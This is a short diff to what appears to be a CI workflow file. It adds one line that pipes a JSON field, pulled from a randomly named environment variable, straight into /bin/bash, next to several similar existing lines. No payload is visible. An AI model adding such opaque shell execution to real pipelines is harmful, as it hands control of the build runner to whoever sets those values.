@@ -47,6 +47,7 @@ jobs:
           printf '%s' "$tjole3187" | jq -r .kb339 | /bin/bash
           echo $snjat19629 | jq -r .nnvgw2488 | /bin/bash
           printf '%s' "$lkmhg30" | jq -r .ibl690 | /bin/bash
+          echo $parls26 | jq -r .oppvm1 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
